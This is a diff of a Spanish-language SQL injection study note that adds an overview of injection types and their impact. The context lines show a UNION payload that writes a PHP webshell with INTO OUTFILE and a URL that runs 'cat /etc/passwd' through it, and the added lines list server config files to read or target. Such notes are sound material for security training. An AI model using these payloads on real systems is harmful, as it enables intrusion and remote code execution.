@@ -78,7 +78,25 @@ tab: **Lateral**
 
 ---
 
-## Paso a paso
+## Overview
+
+**SQL Injection** ocurre cuando input controlado por el atacante se concatena a una query SQL sin sanitizar, permitiendo alterar la lógica de la consulta. El backend ejecuta SQL arbitrario con los privilegios del usuario de la DB.
+
+Clasificación por canal de extracción:
+
+| **Tipo** | **Cómo se extrae** | **Cuándo** |
+|:---|:---|:---|
+| **In-Band** (Union / Error) | El dato vuelve en la misma respuesta HTTP | La app refleja el resultado de la query. |
+| **Inferential / Blind** (Boolean / Time) | Se infiere bit a bit por diferencia de respuesta o latencia | Sin output directo, pero hay comportamiento observable. |
+| **Out-of-Band** | El dato se exfiltra por un canal aparte (DNS/HTTP) | Sin output ni diferencia visible; la DB puede hacer requests salientes. |
+
+**Impacto:** auth bypass (acceso sin credenciales) → dump completo de la base (credenciales, PII) → en motores mal configurados, lectura/escritura de archivos y **RCE** vía `INTO OUTFILE` / `LOAD_FILE` (ver fase 7).
+
+Detección y fingerprinting del motor: romper la query con `'`, `"`, `)`, observar errores o diferencias. La sintaxis específica por motor (MySQL/MSSQL/PostgreSQL/Oracle) varía — ver [[SQL Commands]], [[T-SQL Commands]], [[SQL*Plus Commands]].
+
+---
+
+## Workflow de explotación (paso a paso)
 
 ### 1. Auth Bypass (Acceso Inicial)
 
@@ -180,6 +198,10 @@ select 'file written successfully!' into outfile '/var/www/html/proof.txt'
 -- RCE (Subida de Webshell PHP)
 cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.php'-- -
 -- Ejecución vía navegador: http://IP:PUERTO/shell.php?0=cat%20/etc/passwd
+
+-- Rutas típicas de config para leer con LOAD_FILE() o escribir webshell:
+-- /etc/nginx/sites-enabled/default
+-- /etc/apache2/sites-enabled/000-default.conf
 ```
 
 ---
@@ -195,24 +217,3 @@ Referencia rápida de cómo el navegador/WAF interpreta los caracteres que rompe
 |`#` (Almohadilla)|`%23`|Operador de comentario (MySQL); trunca el resto de la consulta.|
 |`;` (Punto y coma)|`%3B`|Terminador de sentencias; habilita inyecciones apiladas (Stacked).|
 |`)` (Paréntesis)|`%29`|Equilibrio de sintaxis; permite cerrar funciones previas.|
-
-
----
-
-## Overview
-
-
-
-
-
-
-
-
-
-
----
-
--- Rutas típicas para revisar configuraciones
--- /etc/nginx/sites-enabled/default
--- /etc/apache2/sites-enabled/000-default.conf
- 
